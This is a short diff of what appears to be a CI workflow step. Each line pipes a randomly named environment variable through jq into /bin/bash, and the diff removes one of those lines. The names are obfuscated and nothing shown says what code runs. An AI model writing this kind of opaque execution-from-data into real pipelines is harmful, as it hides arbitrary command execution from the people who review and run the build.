@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$ogpop11953" | jq -r .dblq79518 | /bin/bash
           printf '%s' "$t48" | jq -r .kr78 | /bin/bash
-          printf '%s' "$v1123" | jq -r .wff05135 | /bin/bash
           printf '%s' "$lhrep358" | jq -r .nv2 | /bin/bash
           echo $v68 | jq -r .nlht4013 | /bin/bash
           printf '%s' "$kursi37" | jq -r .fgxsf1 | /bin/bash
